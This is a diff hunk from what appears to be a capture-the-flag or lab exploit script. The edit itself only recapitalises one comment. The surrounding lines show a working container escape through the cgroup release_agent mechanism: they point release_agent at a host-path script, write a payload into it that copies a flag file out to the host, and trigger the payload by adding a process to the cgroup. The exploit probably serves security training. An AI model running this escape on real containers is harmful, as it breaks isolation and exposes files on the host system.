@@ -17,7 +17,7 @@ echo "$host_path/exploit" > /tmp/cgrp/release_agent
 echo '#!/bin/sh' > /exploit
 # We added a command to the /exploit file that will cat a flag and echo it to the a file called flag.txt
 echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
-#make the exploit executable
+# Make the exploit executable
 chmod a+x /exploit
 # This step should be done because the release_agent will execute the commands inside once it releases the cgroup, so we need to make a new process and since it is a quick process it will end soon and release_agent will be triggered to execute our code
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
